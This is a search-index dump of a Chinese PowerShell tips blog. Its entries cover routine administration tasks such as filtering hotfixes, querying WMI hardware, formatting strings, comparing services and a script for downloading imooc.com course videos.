是一个用于返回已安装的 hotfix 的 cmdlet。不过它没有可以过滤 hotfix 编号的参数。 通过一个 cmdlet 过滤器，您可以很方便地查看您关注的 hotfix。这个例子只返回编号为“KB25”开头的 hotfix： Get-HotFix | Where-Object { $_.HotfixID -like 'KB25*' } 请注意 Get-HotFix 有一个 -ComputerName 参数，所以如果您拥有了合适的权限，那么您也可以从远程计算机中获取 hotfix 信息。","link":"/2014/08/21/filtering-hotfix-information/"},{"title":"PowerShell 技能连载 - 理解顺序过滤","text":"适用于 PowerShell 所有版本 当您在解析基于文本的日志文件时，或是需要过滤其它类型的信息时，往往需要使用 Where-Object 命令。以下是一些常见的场景，演示如何合并过滤器： # logical AND filter for ALL keywords Get-Content -Path C:\\windows\\WindowsUpdate.log | Where-Object { $_ -like '*successfully installed*' } | Where-Object { $_ -like '*framework*' } | Out-GridView # above example can also be written in one line # by using the -and operator # the resulting code is NOT faster, though, just harder to read Get-Content -Path C:\\windows\\WindowsUpdate.log | Where-Object { ($_ -like '*successfully installed*') -and ($_ -like '*framework*') } | Out-GridView # logical -or (either condition is met) can only be applied in one line Get-Content -Path C:\\windows\\WindowsUpdate.log | Where-Object { ($_ -like '*successfully installed*') -or ($_ -like '*framework*') } | Out-GridView","link":"/2014/08/22/understanding-sequential-filtering/"},{"title":"PowerShell 技能连载 - 获取睡眠或休眠的时间","text":"适用于 PowerShell 所有版本 如果您希望确认某台机器是否频繁地进入睡眠或者休眠模式，以下是一个读取对应的日志并返回详细信息的函数。它能汇报计算机何时进入睡眠模式，以及它进入睡眠模式的时长： function Get-HibernationTime { # get hibernation events Get-EventLog -LogName system -InstanceId 1 -Source Microsoft-Windows-Power-TroubleShooter | ForEach-Object { # create new object for results $result = 'dummy' | Select-Object -Property ComputerName, SleepTime, WakeTime, Duration # store details in new object, convert datatype where appropriate [DateTime]$result.Sleeptime = $_.ReplacementStrings[0] [DateTime]$result.WakeTime = $_.ReplacementStrings[1] $time = $result.WakeTime - $result.SleepTime $result.Duration = ([int]($time.TotalHours * 100))/100 $result.ComputerName = $_.MachineName # return result $result } }","link":"/2014/08/25/get-sleep-and-hibernation-times/"},{"title":"PowerShell 技能连载 - 获取 WMI 设备清单","text":"适用于 PowerShell 所有版本 WMI 服务可以用来汇报许多关于计算机硬件的详细信息。通常，每种类型的硬件表现为一个对应的 WMI 类。不过，不太容易找出这些硬件的类。 由于所有硬件类都继承自相同的 WMI 根类（CIM_LogicalDevice），所以您可以使用这个根类来查找所有的硬件： Get-WmiObject -Class CIM_LogicalDevice | Out-GridView 这将返回一个基本的硬件清单。不过您还可以做更多的事情。通过一点额外的代码，您可以用 WMI 获取一个硬件的类名清单： Get-WmiObject -Class CIM_LogicalDevice | Select-Object -Property __Class, Description | Sort-Object -Property __Class -Unique | Out-GridView 您现在可以使用这些类名中的任意一个来查询某种特定的硬件，获取其详细信息： PS&gt; Get-WmiObject -Class Win32_SoundDevice Manufacturer Name Status StatusInfo ------------ ---- ------ ---------- Cirrus Logic, Inc. Cirrus Logic CS4... OK 3 Intel(R) Corpora... Intel(R) Display... OK 3","link":"/2014/08/26/wmi-device-inventory/"},{"title":"PowerShell 技能连载 - 测试服务的响应性","text":"适用于 PowerShell 所有版本 要测试某个服务是否仍然可响应，可以使用这个聪明的点子。首先，向 WMI 查询您想要检查的服务。WMI 将会开心地返回对应进程的 ID。 接下来，查询该进程。进程对象将会告知您该进程是冻结还是可响应的状态： function Test-ServiceResponding($ServiceName) { $service = Get-WmiObject -Class Win32_Service -Filter &quot;Name='$ServiceName'&quot; $processID = $service.processID $process = Get-Process -Id $processID $process.Responding } 这个例子将会检测 Spooler 服务是否可响应： PS&gt; Test-ServiceResponding -ServiceName Spooler True 请注意，该示例代码假设服务正在运行。如果您想试试的话，您可以自己检测一下，排除非正在运行的服务。","link":"/2014/08/27/test-service-responsiveness/"},{"title":"PowerShell 技能连载 - 查找插入的 U 盘","text":"适用于 PowerShell 所有版本 如果您想知道是否有已插入电脑的 USB 存储设备，那么 WMI 可以做到： Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.DeviceID -like 'USBSTOR*' } 这将返回所有“USBSTOR”类的即插即用设备。 如果您想用 WMI 查询语言（WQL），您还可以用命令过滤器来实现： Get-WmiObject -Query 'Select * From Win32_PnPEntity where DeviceID Like &quot;USBSTOR%&quot;'","link":"/2014/08/28/finding-attached-usb-sticks/"},{"title":"PowerShell 技能连载 - 获取系统开机时长","text":"适用于 PowerShell 所有版本 Windows 每次启动的时候，都启动一个高精度计数器，这个计数器将返回系统运行的毫秒数： $millisecondsUptime = [Environment]::TickCount &quot;I am up for $millisecondsUptime milliseconds!&quot; 由于您很难对毫秒有兴趣，所以请使用 New-TimeSpan 来将毫秒（顺便提一下，也可以是任何其它时间间隔）转换为有意义的单位： $millisecondsUptime = [Environment]::TickCount &quot;I am up for $millisecondsUptime milliseconds!&quot; $timespan = New-TimeSpan -Seconds ($millisecondsUptime/1000) $timespan 那么现在，您可以使用 TimeSpan 型的 $timespan 对象以您想要的任何格式来汇报启动的时间： $millisecondsUptime = [Environment]::TickCount &quot;I am up for $millisecondsUptime milliseconds!&quot; $timespan = New-TimeSpan -Seconds ($millisecondsUptime/1000) $hours = $timespan.TotalHours &quot;System is up for {0:n0} hours now.&quot; -f $hours 由于 New-TimeSpan 无法直接处理毫秒，所以需要做一个特殊处理。该脚本直接将毫秒数除以 1000，会引入一个小误差。 要将毫秒数转换为一个 TimeSpan 对象而不损失任何精度，请试试以下代码： $timespan = [Timespan]::FromMilliseconds($millisecondsUptime) 在这个例子中，它们没有区别。但是它在其它情况下可能很有用。例如，您还可以使用 FromTicks() 方法将时钟周期数（Windows 系统中的最小时间周期单位）转换为时间间隔。","link":"/2014/08/29/system-uptime/"},{"title":"PowerShell 技能连载 - 播放 WAV 声音","text":"适用于 PowerShell 3.0 或以上版本 PowerShell 可以用内置的 SoundPlayer 类播放 WAV 背景声音。它可以接受一个 WAV 文件的路径参数，然后可以指定只播放一次还是循环播放。 以下代码将循环播放一段声音： $player = New-Object -TypeName System.Media.SoundPlayer $player.SoundLocation = 'C:\\Windows\\Media\\chimes.wav' $player.Load() $player.PlayLooping() 当您的脚本执行完以后，可以通过这行代码停止播放： $player.Stop() 如果您想将自定义的声音文件和您的 PowerShell 脚本一块分发，只需要将它存放在脚本的同一个文件夹下，然后用 $PSScriptRoot 来引用脚本所在的文件夹。 这个例子将播放脚本目录下的 _mySound.wav_： $player = New-Object -TypeName System.Media.SoundPlayer $player.SoundLocation = &quot;$PSScriptRoot\\mySound.wav&quot; $player.Load() $player.PlayLooping() # do something... Start-Sleep -Seconds 5 $player.Stop() 请注意 $PSScriptRoot 需要 PowerShell 3.0 或以上版本。当然，它也需要您先将脚本保存到文件。","link":"/2014/09/01/playing-wav-sounds/"},{"title":"PowerShell 技能连载 - 使用 -f 操作符合并字符串和数据","text":"适用于 PowerShell 所有版本 用双引号包围的字符串能够解析变量，所以类似这样的书写方式很常见： $name = $host.Name &quot;Your host is called $name.&quot; 然而，这种技术有一些限制。如果您想显示对象的属性而不只是变量，将会失败： PS&gt; &quot;Your host is called $host.Name.&quot; Your host is called System.Management.Automation.Internal.Host.InternalHost.Name. 这是因为 PowerShell 只会解析变量（在例子中是 $host），而不是代码中的剩余部分。 而且您也无法控制数字格式。这段代码可以工作，但是显示的小数位数太多，看起来不美观： # get available space in bytes for C: drive $freeSpace = ([WMI]'Win32_LogicalDisk.DeviceID=&quot;C:&quot;').FreeSpace # convert to MB $freeSpaceMB = $freeSpace / 1MB # output &quot;Your C: drive has $freeSpaceMB MB space available.&quot; -f 操作符可以解决这两个问题。它的左侧是一个静态的文本模板，右侧是提供给模板用的值： # insert any data into the text template 'Your host is called {0}.' -f $host.Name # calculate free space on C: in MB $freeSpace = ([WMI]'Win32_LogicalDisk.DeviceID=&quot;C:&quot;').FreeSpace $freeSpaceMB = $freeSpace /1MB # output with just ONE digit after the comma 'Your C: drive has {0:n1} MB space available.' -f $freeSpaceMB 如您所见，使用 -f 可以给您带来两个好处：占位符（花括号）指示 PowerShell 插入点的位置，并且占位符还可以接受格式化信息。“n1”代表小数点后 1 位。只需要调整数值就能满足您的需要。","link":"/2014/09/02/using-f-operator-to-combine-string-and-data/"},{"title":"PowerShell 技能连载 - 计算倒计时小时数","text":"适用于 PowerShell 所有版本 当遇到生日或重要的赛事时，您可能会想到用 PowerShell 来计算事件还有多少小时到来。以下是实现方法： $result = New-TimeSpan -End '2014-12-25 06:45:00' $hours = [Int]$result.TotalHours 'Another {0:n0} hours to go...' -f $hours 这个例子计算距离 2014 年圣诞节还剩余的小时数。只需要替换代码中的日期，就可以得到距您期待的事件到来还有多少小时。","link":"/2014/09/03/countdown-hours/"},{"title":"用 PowerShell 快速转义、反转义 URI","text":"有 PowerShell 在手，进行 URI 转义、反转义这点小事就不需要找别的工具了。 # 对 URI 进行转义 [System.Uri]::EscapeUriString('http://www.baidu.com/s?ie=UTF-8&amp;wd=中文') # http://www.baidu.com/s?ie=UTF-8&amp;wd=%E4%B8%AD%E6%96%87 # 对数据进行转义 [System.Uri]::EscapeDataString('http://www.baidu.com/s?ie=UTF-8&amp;wd=中文') # http%3A%2F%2Fwww.baidu.com%2Fs%3Fie%3DUTF-8%26wd%3D%E4%B8%AD%E6%96%87 # 对 HEX 数据进行反转义 [System.Uri]::UnescapeDataString('http://www.baidu.com/s?ie=UTF-8&amp;wd=%E4%B8%AD%E6%96%87') # http://www.baidu.com/s?ie=UTF-8&amp;wd=中文","link":"/2014/09/03/escape-unescape-uri/"},{"title":"PowerShell 技能连载 - 合并执行结果","text":"适用于 PowerShell 所有版本 假设您想检查可疑的服务状态，例如启动类型为“自动”而状态处于停止的，或检查服务的 ExitCode 为非正常值的。 以下是一些示例代码，演示如何查询这些场景并将执行结果合并为一个变量。 Sort-Object 确保您的结果在输出到 grid view 窗口之前是不重复的。 $list = @() $list += Get-WmiObject -Class Win32_Service -Filter 'State=&quot;Stopped&quot; and StartMode=&quot;Auto&quot; and ExitCode!=0' | Select-Object -Property Name, DisplayName, ExitCode, Description, PathName, DesktopInteract $list += Get-WmiObject -Class Win32_Service -Filter 'ExitCode!=0 and ExitCode!=1077' | Select-Object -Property Name, DisplayName, ExitCode, Description, PathName, DesktopInteract $list | # remove identical (-Unique) Sort-Object -Unique -Property Name | Out-GridView","link":"/2014/09/04/combining-results/"},{"title":"PowerShell 技能连载 - 查找最大值和最小值","text":"适用于 PowerShell 所有版本 要查找一系列数据中的最小值和最大值，请使用 Measure-Object 命令： $list = 1,4,3,1,3,12,990 $result = $list | Measure-Object -Minimum -Maximum $result.Minimum $result.Maximum 它对输入的任何数据类型都有效。以下是稍作修改的代码，可以返回 Windows 文件夹中最旧和最新的文件： $list = Get-ChildItem -Path C:\\windows $result = $list | Measure-Object -Property LastWriteTime -Minimum -Maximum $result.Minimum $result.Maximum 如果您的输入数据有多个属性，只需要加上 -Property 参数，并选择您想检测的属性即可。","link":"/2014/09/05/finding-minimum-and-maximum-values/"},{"title":"PowerShell 技能连载 - 快速处理路径","text":"适用于 PowerShell 所有版本 以下是一系列有用的（并且易用的）用于处理文件路径的系统函数： [System.IO.Path]::GetFileNameWithoutExtension('file.ps1') [System.IO.Path]::GetExtension('file.ps1') [System.IO.Path]::ChangeExtension('file.ps1', '.copy.ps1') [System.IO.Path]::GetFileNameWithoutExtension('c:\\test\\file.ps1') [System.IO.Path]::GetExtension('c:\\test\\file.ps1') [System.IO.Path]::ChangeExtension('c:\\test\\file.ps1', '.bak') 所有这些方法都能接受文件名称或完整路径参数、能返回路径的不同部分，或改变其中的部分，例如扩展名。","link":"/2014/09/08/useful-path-manipulation-shortcuts/"},{"title":"PowerShell 技能连载 - 重要的数学函数","text":"适用于 PowerShell 不同版本 以下是管理脚本中最重要的 4 个数学函数： [Math]::Floor(4.9) [Math]::Ceiling(3.2) [Math]::Max(3,8) [Math]::Min(3,8)","link":"/2014/09/09/important-math-functions/"},{"title":"PowerShell 技能连载 - 同时支持可选参数和必选参数","text":"适用于 PowerShell 所有版本 一个函数的参数是否能既为可选的，又为必选的呢？这是可以的，基于不同的上下文即可。 一个参数可以在当其它参数存在的时候为必选的，否则为可选的。 function Connect-Somewhere { [CmdletBinding(DefaultParameterSetName='A')] param ( [Parameter(ParameterSetName='A',Mandatory=$false)] [Parameter(ParameterSetName='B',Mandatory=$true)] $ComputerName, [Parameter(ParameterSetName='B',Mandatory=$false)] $Credential ) $chosen = $PSCmdlet.ParameterSetName &quot;You have chosen $chosen parameter set.&quot; } # -Computername is optional Connect-Somewhere # here, -Computername is mandatory Connect-Somewhere -Credential test","link":"/2014/09/10/optional-and-mandatory-at-the-same-time/"},{"title":"PowerShell 技能连载 - 忽略输出结果","text":"适用于 PowerShell 所有版本 由于 PowerShell 会将所有命令的执行结果返回，所以在 PowerShell 脚本中忽略掉所有不希望返回的结果是十分重要的。 有很多方法能实现这个目的，以下是最常见的两种。请注意每行都会尝试在您的 C: 创建一个新的文件夹。New-Item 命令将会返回一个新的文件夹对象，但是如果您只是希望创建一个新的文件夹，那么您很可能希望忽略掉返回的结果： 123$null = New-Item -Path c:\\newfolderA -ItemType DirectoryNew-Item -Path c:\\newfolderB -ItemType Directory | Out-Null 哪么那种方式更好呢？当然是第一种方式了。将不需要的结果通过管道传送给 Out-Null 的开销是很大的，能达到将近 40 倍的差别。只调用一次的差别并不明显，但如果在一个循环中的话，差异就很明显了。 So better get into the habit of using $null rather than Out-Null!所以最好养成习惯使用 $null 而不是 Out-Null！","link":"/2014/09/11/discarding-results/"},{"title":"PowerShell 技能连载 - 移除非法的路径字符","text":"适用于 PowerShell 所有版本 在路径名中，有些字符，例如冒号和双引号，都是非法的。如果您的脚本中的路径名称来自于外部信息，那么您可能希望最终的路径名是合法的。 以下是一个将路径中所有非法字符替换成下划线的函数： function Get-LegalPathName($Path) { $illegalChars = [System.IO.Path]::GetInvalidFileNameChars() foreach($illegalChar in $illegalChars) { $Path = $Path.Replace($illegalChar, '_') } $Path } 这是结果看起来的样子： PS&gt; Get-LegalPathName 'some:&quot;illegal&quot;\\path&lt;chars&gt;.txt' some__illegal__path_chars_.txt","link":"/2014/09/12/removing-illegal-pathcharacters/"},{"title":"PowerShell 技能连载 - 获取字符串的行数","text":"适用于 PowerShell 所有版本 以下是一个获取字符串（而不是字符串数组！）行数的技巧： $text = @' This is some sample text Let's find out the number of lines. '@ $text.Length - $text.Replace(&quot;`n&quot;,'').Length + 1 技术上来说，这个例子用的是 here-string 来创建多行字符串，不过这只是一个例子。它对所有类型的字符串都有效，无论它的来源是什么。","link":"/2014/09/15/getting-the-number-of-lines-in-a-string/"},{"title":"PowerShell 技能连载 - 检测文本中是否含有大写字母","text":"适用于 PowerShell 任何版本 可以使用正则表达式来检测一个字符串是否包含至少一个大写字母： $text1 = 'this is all lower-case' $text2 = 'this is NOT all lower-case' $text1 -cmatch '[A-Z]' $text2 -cmatch '[A-Z]' 得到的结果分别是“Frue”和“False”。 要检测一段文本是否只包含小写字母，请试试这段代码： $text1 = 'this is all lower-case' $text2 = 'this is NOT all lower-case' $text1 -cmatch '^[a-z\\s-]*$' $text2 -cmatch '^[A-Z\\s-]*$' 得到的结果分别是“True”和“False”。 实际上检测起来会更麻烦，因为您需要包括所有合法的字符。在这个例子中，我选择了 a-z 的小写字母、空格和减号。 这些“合法”的字符被包含在“^”和“$”（行首符和行尾符）之间。星号是一个量词（任意数量个“合法的”字符）。","link":"/2014/09/16/testing-whether-text-contains-upper-case/"},{"title":"PowerShell 技能连载 - 查找脚本中的错误","text":"适用于 PowerShell 所有版本 没有比这种更简单的方法来查找脚本中的语法错误了。只需要用这个过滤器： filter Test-SyntaxError { $text = Get-Content -Path $_.FullName if ($text.Length -gt 0) { $err = $null $null = [System.Management.Automation.PSParser]::Tokenize($text, [ref] $err) if ($err) { $_ } } } 通过使用这个过滤器，您可以快速地扫描文件夹，甚至整台计算机，列出所有包含语法错误的 PowerShell 文件。 以下代码将在您的用户文件夹下遍历并查找所有的 PowerShell 脚本并列出包含语法错误的文件： PS&gt; dir $home -Filter *.ps1 -Recurse -Exclude *.ps1xml | Test-SyntaxError","link":"/2014/09/17/finding-errors-in-scripts/"},{"title":"PowerShell 技能连载 - 等待按键","text":"适用于 PowerShell 所有版本，仅适用于 PowerShell 控制台 若希望脚本执行结束时，保持 PowerShell 控制台程序为打开状态，您也许希望增加一句“按任意键继续”语句。以下是实现方式： Write-Host 'Press Any Key!' -NoNewline $null = [Console]::ReadKey('?') 这段代码仅适用于真实的 PowerShell 控制台。它在 ISE 编辑器或其它未使用真实互操作键盘缓冲区的控制台程序中并不适用。","link":"/2014/09/18/waiting-for-a-keystroke/"},{"title":"PowerShell 技能连载 - 下载 PowerShell 语言规范","text":"适用于 PowerShell 所有版本 在 PowerShell 中，从 Internet 中下载文件十分方便。以下这段代码能够自动将 PowerShell 语言规范——包含 PowerShell 精华和内核知识的很棒的 Word 文档——下载到您的机器上。 $link = 'http://download.microsoft.com/download/3/2/6/326DF7A1-EE5B-491B-9130-F9AA9C23C29A/PowerShell%202%200%20Language%20Specification.docx' $outfile = &quot;$env:temp\\languageref.docx&quot; Invoke-WebRequest -Uri $link -OutFile $outfile Invoke-Item -Path $outfile","link":"/2014/09/19/download-powershell-language-specification/"},{"title":"PowerShell 技能连载 - 比较服务配置","text":"适用于 PowerShell 3.0 或更高版本 假设您在两台服务器上启用了 PowerShell 远程服务，那么下面这个简单的脚本演示了如何从每台服务器上获取所有服务的状态并且计算两台服务器之间的差异。 $Server1 = 'myServer1' $Server2 = 'someOtherServer' $services1 = Invoke-Command { Get-Service } -ComputerName $Server1 | Sort-Object -Property Name, Status $services2 = Invoke-Command { Get-Service } -ComputerName $Server2 | Sort-Object -Property Name, Status Compare-Object -ReferenceObject $services1 -DifferenceObject $services2 -Property Name, Status -PassThru | Sort-Object -Property Name 得到的结果是服务配置差异的清单。","link":"/2014/09/22/comparing-service-configuration/"},{"title":"PowerShell 技能连载 - 导出服务状态信息","text":"适用于 PowerShell 所有版本 如果您想将一个 PowerShell 命令的结果保存到磁盘上，以便传到另一台机器上，以下是简单的实现方法： $Path = &quot;$env:temp\\mylist.xml&quot; Get-Service | Add-Member -MemberType NoteProperty -Name ComputerName -Value $env:COMPUTERNAME -PassThru | Export-Clixml -Depth 1 -Path $Path explorer.exe &quot;/select,$Path&quot; 这段代码用 Get-Service 获取所有的服务。结果添加了一个“ComputerName”字段，用于保存生成的数据所在的计算机名。 然后，得到的结果被序列化成 XML 并保存到磁盘上。接着在目标文件夹打开资源管理器，并且选中创建的 XML 文件。这样您就可以方便地将它拷到 U 盘中随身带走。 要将结果反序列化成真实的对象，使用以下代码： $Path = &quot;$env:temp\\mylist.xml&quot; Import-Clixml -Path $Path","link":"/2014/09/23/dumping-service-state-information/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 函数","text":"适用于 PowerShell 3.0 或更高版本 要快速扫描您的 PowerShell 脚本仓库并在其中查找某个函数，请使用以下过滤器： filter Find-Function { $path = $_.FullName $lastwrite = $_.LastWriteTime $text = Get-Content -Path $path if ($text.Length -gt 0) { $token = $null $errors = $null $ast = [System.Management.Automation.Language.Parser]::ParseInput($text, [ref] $token, [ref] $errors) $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | Select-Object -Property Name, Path, LastWriteTime | ForEach-Object { $_.Path = $path $_.LastWriteTime = $lastwrite $_ } } } 以下是扫描您的用户配置文件中所有定义了函数的 PowerShell 脚本的方法： PS&gt; dir $home -Filter *.ps1 -Recurse -Exclude *.ps1xml | Find-Function Name Path LastWriteTime ---- ---- ------------- Inject-LogonCredentials C:\\Users\\Tobias\\Desktop... 06.01.2014 02:43:00 Test-Command C:\\Users\\Tobias\\Desktop... 06.03.2014 10:17:02 Test C:\\Users\\Tobias\\Desktop... 30.01.2014 09:32:20 Get-WebPictureOriginal C:\\Users\\Tobias\\Desktop... 11.12.2013 11:37:53 Get-ConnectionString C:\\Users\\Tobias\\Documen... 23.05.2014 10:49:09 Convert-SID2User C:\\Users\\Tobias\\Documen... 23.05.2014 15:33:06 Lock-Screen C:\\Users\\Tobias\\Documen... 19.03.2014 12:51:54 Show-OpenFileDialog C:\\Users\\Tobias\\Documen... 16.05.2014 13:42:16 Show-UniversalData C:\\Users\\Tobias\\Documen... 16.05.2014 13:23:20 Start-TimebombMemory C:\\Users\\Tobias\\Documen... 23.05.2014 09:12:28 Stop-TimebombMemory C:\\Users\\Tobias\\Documen... 23.05.2014 09:12:28 (...) 只需要将结果通过管道输出到 Out-GridView 就能查看完整的信息。","link":"/2014/09/24/finding-powershell-functions/"},{"title":"PowerShell 电子书合集","text":"搜集到的所有 PowerShell 电子书 共享链接将来一旦有更新，就会自动同步、自动更新，再也不用为资料发愁了。如果您也有好料想一起分享，请在群里发个消息，我把读写权限给您。 最好在客户端的 文件夹 / 偏好设定 中的 搜索 DHT 网络 前打上勾，可以提高成功率 :)","link":"/2014/09/24/powershell-ebooks-collection/"},{"title":"PowerShell 技能连载 - 创建短网址","text":"适用于 PowerShell 所有版本 您也许听说过长网址的缩短服务。有许多这类免费的服务。以下是一个将任何网址转化为短网址的脚本： $OriginalURL = 'http://www.powertheshell.com/isesteroids2' $url = &quot;http://tinyurl.com/api-create.php?url=$OriginalURL&quot; $webclient = New-Object -TypeName System.Net.WebClient $webclient.DownloadString($url) 只需要将需要缩短的网址赋给 $OriginalURL，运行脚本。它将返回对应的短网址。","link":"/2014/09/25/creating-tinyurls/"},{"title":"用 PowerShell 下载 imooc.com 的视频教程","text":"这是一个从 http://www.imooc.com 教学网站批量下载视频的 PowerShell 脚本。默认下载的是最高清晰度的视频。 按课程专辑 URL 下载您可以传入课程专辑的 URL 作为下载参数： .\\Download-Imooc.ps1 http://www.imooc.com/learn/197 按课程专辑 ID 下载可以一口气传入多个课程专辑的 ID 作为参数： .\\Download-Imooc.ps1 75,197 自动续传如果不传任何参数的话，将在当前文件夹中搜索已下载的课程，并自动续传。 .\\Download-Imooc.ps1 自动合并视频如果希望自动合并所有视频，请使用 -Combine 参数。该参数可以和其它参数同时使用。 .\\Download-Imooc.ps1 -Combine 关于代码中用到了参数分组、-WhatIf 处理等技术，供参考。 以下是源代码： # Require PowerShell 3.0 or higher. [CmdletBinding(DefaultParameterSetName='URI', SupportsShouldProcess=$true, ConfirmImpact='Medium')] Param ( [Parameter(ParameterSetName='URI',Position = 0)] [string] $Uri, # 'http://www.imooc.com/learn/197' [Parameter(ParameterSetName='ID', Position = 0)] [int[]] $ID, # @(75, 197) [Switch] $Combine, # = $true [Switch] $RemoveOriginal ) # $DebugPreference = 'Continue' # Continue, SilentlyContinue # $WhatIfPreference = $true # $true, $false # 修正文件名，将文件系统不支持的字符替换成“.” function Fix-FileName { Param ( $FileName ) [System.IO.Path]::GetInvalidFileNameChars() | ForEach-Object { $FileName = $FileName.Replace($_, '.') } return $FileName } # 修正目录名，将文件系统不支持的字符替换成“.” function Fix-FolderName { Param ( $FolderName ) [System.IO.Path]::GetInvalidPathChars() | ForEach-Object { $FolderName = $FolderName.Replace($_, '.') } return $FolderName } # 从专辑页面中分析标题和视频页面的 ID。 function Get-ID { Param ( $Uri ) $Uri = $Uri.Replace('/view/', '/learn/') $Uri = $Uri.Replace('/qa/', '/learn/') $Uri = $Uri.Replace('/note/', '/learn/') $Uri = $Uri.Replace('/wiki/', '/learn/') $response = Invoke-WebRequest $Uri $title = $response.ParsedHtml.title echo $title $links = $response.Links $links | ForEach-Object { if ($_.href -cmatch '(?m)^/video/(\\d+)$') { return [PSCustomObject][Ordered]@{ Title = $_.InnerText; ID = $Matches[1] } } } } # 获取视频下载地址。 function Get-VideoUri { Param ( [Parameter(ValueFromPipeline=$true)] $ID ) $template = 'http://www.imooc.com/course/ajaxmediainfo/?mid={0}&amp;mode=flash' $uri = $template -f $ID Write-Debug $uri $result = Invoke-RestMethod $uri if ($result.result -ne 0) { Write-Warning $result.result } $uri = $result.data.result.mpath.'0' # 取最高清晰度的版本。 $uri = $uri.Replace('L.flv', 'H.flv').Replace('M.flv', 'H.flv') return $uri } # 创建“.url”快捷方式。 function New-ShortCut { Param ( $Title, $Uri ) $shell = New-Object -ComObject 'wscript.shell' $dir = pwd $path = Join-Path $dir &quot;$Title\\$Title.url&quot; $lnk = $shell.CreateShortcut($path) $lnk.TargetPath = $Uri $lnk.Save() } function Assert-PSVersion { if (($PSVersionTable.PSCompatibleVersions | Where-Object Major -ge 3).Count -eq 0) { Write-Error '请安装 PowerShell 3.0 以上的版本。' exit } } function Get-ExistingCourses { Get-ChildItem -Directory | ForEach-Object { $folder = $_ $expectedFilePath = (Join-Path $folder $folder.Name) + '.url' if (Test-Path -PathType Leaf $expectedFilePath) { $shell = New-Object -ComObject 'wscript.shell' $lnk = $shell.CreateShortcut($expectedFilePath) $targetPath = $lnk.TargetPath if ($targetPath -cmatch '(?m)\\A^http://www\\.imooc\\.com/\\w+/\\d+$\\z') { echo $targetPath } } } } # 下载课程。 function Download-Course { Param ( [string]$Uri ) Write-Progress -Activity '下载视频' -Status '分析视频 ID' $title, $ids = Get-ID -Uri $Uri Write-Output &quot;课程名称：$title&quot; Write-Debug $title $folderName = Fix-FolderName $title Write-Debug $folderName if (-not (Test-Path $folderName)) { $null = mkdir $folderName } New-ShortCut -Title $title -Uri $Uri $outputPathes = New-Object System.Collections.ArrayList $actualDownloadAny = $false #$ids = $ids | Select-Object -First 3 $ids | ForEach-Object { if ($_.Title -cnotmatch '(?m)^\\d') { return } $title = $_.Title Write-Progress -Activity '下载视频' -Status '获取视频地址' $videoUrl = Get-VideoUri $_.ID $extension = ($videoUrl -split '\\.')[-1] $title = Fix-FileName $title $outputPath = &quot;$folderName\\$title.$extension&quot; $null = $outputPathes.Add($outputPath) Write-Output $title Write-Debug $videoUrl Write-Debug $outputPath if (Test-Path $outputPath) { Write-Debug &quot;目标文件 $outputPath 已存在，自动跳过&quot; } else { Write-Progress -Activity '下载视频' -Status &quot;下载《$title》视频文件&quot; if ($PSCmdlet.ShouldProcess(&quot;$videoUrl&quot;, 'Invoke-WebRequest')) { Invoke-WebRequest -Uri $videoUrl -OutFile $outputPath $actualDownloadAny = $true } } } $targetFile = &quot;$folderName\\$folderName.flv&quot; #if ($Combine -and ($actualDownloadAny -or -not (Test-Path $targetFile))) { if ($Combine) { # -and ($actualDownloadAny -or -not (Test-Path $targetFile))) { if ($actualDownloadAny -or -not (Test-Path $targetFile) -or (Test-Path $targetFile) -and $PSCmdlet.ShouldProcess('分段视频', '合并')) { Write-Progress -Activity '下载视频' -Status '合并视频' Write-Output (&quot;合并视频（共 {0:N0} 个）&quot; -f $outputPathes.Count) $outputPathes.Insert(0, $targetFile) $eap = $ErrorActionPreference $ErrorActionPreference = &quot;SilentlyContinue&quot; .\\FlvBind.exe $outputPathes.ToArray() $ErrorActionPreference = $eap &lt;# $outputPathes = $outputPathes | ForEach-Object { &quot;`&quot;$_`&quot;&quot; } Start-Process ` -WorkingDirectory (pwd) ` -FilePath .\\FlvBind.exe ` -ArgumentList $outputPathes ` -NoNewWindow ` -Wait ` -ErrorAction SilentlyContinue ` -WindowStyle Hidden #&gt; if ($?) { Write-Output '视频合并成功' if ($RemoveOriginal -and $PSCmdlet.ShouldProcess('分段视频', '删除')) { $outputPathes.RemoveAt(0) $outputPathes | ForEach-Object { Remove-Item $_ } Write-Output '原始视频删除完毕' } } else { Write-Warning '视频合并失败' } } } } Assert-PSVersion # 判断参数集 $chosen= $PSCmdlet.ParameterSetName if ($chosen -eq 'URI') { if ($Uri) { Download-Course $Uri } else { Get-ExistingCourses | ForEach-Object { Download-Course $_ } } } if ($chosen -eq 'ID') { $template = 'http://www.imooc.com/learn/{0}' $ID | ForEach-Object { $Uri = $template -f $_ Download-Course $Uri } } 您也可以从这里下载完整的代码。","link":"/2014/09/26/download-videos-from-imooc-com-by-powershell/"},{"title":"PowerShell 技能连载 - 替换重复的空格","text":"适用于 PowerShell 所有版本 要删除重复的空格，请使用这个正则表达式： PS&gt; '[ Man, it works! ]' -replace '\\s{2,}', ' ' [ Man, it works! ] 您也可以用这种方式将固定宽度的文本表格转成 CSV 数据： PS&gt; (qprocess) -replace '\\s{2,}', ',' &gt;tobias,console,1,3876,taskhostex.exe &gt;tobias,console,1,3844,explorer.exe &gt;tobias,console,1,4292,tabtip.exe 当得到 CSV 数据之后，您可以用 ConvertFrom-Csv 将文本数据转换为对象： PS&gt; (qprocess) -replace '\\s{2,}', ',' | ConvertFrom-Csv -Header Name, Session, ID, Pid, Process Name : &gt;tobias Session : console ID : 1 Pid : 3876 Process : taskhostex.exe Name : &gt;tobias Session : console ID : 1 Pid : 3844 Process : explorer.exe Name : &gt;tobias Session : console ID : 1 Pid : 4292 Process : tabtip.exe (...)","link":"/2014/09/26/replacing-duplicate-spaces/"},{"title":"快速选取百度云盘文件","text":"网页版百度云盘一次性只能选取 100 个文件。如果我要对 500 个文件做批量操作就很困难了。 这时候我们可以在浏览器的地址栏内敲入这行代码，就自动帮您勾选前 100 个文件（夹）了： javascript:$(&quot;span[node-type='chk']:lt(101)&quot;).addClass(&quot;chked&quot;)","link":"/2014/09/29/quick-selection-on-baidu-pan/"},{"title":"PowerShell 技能连载 - 分隔文本","text":"适用于 PowerShell 所有版本 我们可以用 -split 操作符按指定的分隔符来分隔文本。这个操作符接受一个正则表达式作为操作数，所以如果您只是希望用纯文本的表达式来作为分隔的操作数，那么您需要将该纯文本转义一下。 以下是用反斜杠来分隔路径的例子： $originalText = 'c:\\windows\\test\\file.txt' $splitText = [RegEx]::Escape('\\') $originalText -split $splitText 结果类似如下，并且它是一个数组： 